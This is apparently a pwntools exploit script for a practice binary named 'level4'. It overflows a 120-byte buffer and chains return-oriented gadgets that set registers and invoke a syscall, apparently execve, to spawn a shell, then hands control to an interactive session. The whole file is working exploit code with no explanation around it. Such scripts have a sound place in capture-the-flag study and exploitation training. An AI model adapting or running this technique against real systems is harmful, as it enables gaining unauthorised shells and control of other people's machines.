from pwn import *
context.update(arch='amd64', os='linux')


pop_rsi = 0x000000000040119c
pop_rdi = 0x000000000040119e
pop_rdx = 0x00000000004011a0
set_rax = 0x0000000000401194
syscall = 0x00000000004011a2

DEBUG = False

if DEBUG:
  r = gdb.debug("./level4")
else:
  r = process("./level4")

elf = ELF("./level4")

offset = 120
special = 0x40202a
payload = cyclic(offset) + p64(set_rax) + p64(pop_rdi) + p64(special) + p64(pop_rsi) + p64(0x0) + p64(pop_rdx) + p64(0x0) + p64(syscall)


r.recvuntil("3?!\n")
r.sendline(payload)
r.interactive()
